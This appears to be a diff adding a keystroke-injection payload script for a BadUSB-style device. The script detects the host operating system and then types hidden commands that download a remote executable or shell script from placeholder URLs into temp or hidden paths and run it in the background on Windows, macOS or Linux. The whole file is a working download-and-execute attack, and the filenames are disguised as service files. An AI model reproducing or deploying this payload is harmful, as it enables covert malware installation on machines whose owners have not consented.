@@ -1,0 +1,38 @@
+REM ============================================================
+REM Multi-OS: fingerprint the host, then run the matching
+REM download-and-run payload. Demonstrates DETECT_OS + IF_OS.
+REM AUTHORIZED USE ONLY.
+REM EDIT ALL THREE URLs before running.
+REM ============================================================
+DELAY 1500
+SCREEN_TEXT fingerprinting... #00E676
+LOG multios: DETECT_OS starting (~10s, lock keys blink)
+DETECT_OS
+IF_OS windows
+  SCREEN_TEXT windows target #00E676
+  GUI r
+  DELAY 600
+  STRINGLN powershell -w h -c "Invoke-WebRequest 'http://example.com/win-tool.exe' -OutFile "$env:TEMP\svc.exe"; Start-Process "$env:TEMP\svc.exe" -WindowStyle Hidden"
+ELSE_IF macos
+  SCREEN_TEXT macos target #00E676
+  GUI SPACE
+  DELAY 600
+  STRING terminal
+  DELAY 400
+  ENTER
+  DELAY 1500
+  STRINGLN curl -sL http://example.com/mac-tool.sh -o /tmp/.svc.sh && chmod +x /tmp/.svc.sh && nohup /tmp/.svc.sh >/dev/null 2>&1 &
+  STRINGLN exit
+ELSE_IF linux
+  SCREEN_TEXT linux target #00E676
+  CTRL ALT T
+  DELAY 1200
+  STRINGLN wget -q http://example.com/linux-tool.sh -O /tmp/.svc.sh && chmod +x /tmp/.svc.sh && nohup /tmp/.svc.sh >/dev/null 2>&1 &
+  STRINGLN exit
+ELSE
+  SCREEN_TEXT unknown OS #FFD600
+  LOG multios: unknown host OS - skipping
+END_IF
+DELAY 800
+LED_BLINK 3 #00FF00
+LOG multios: done
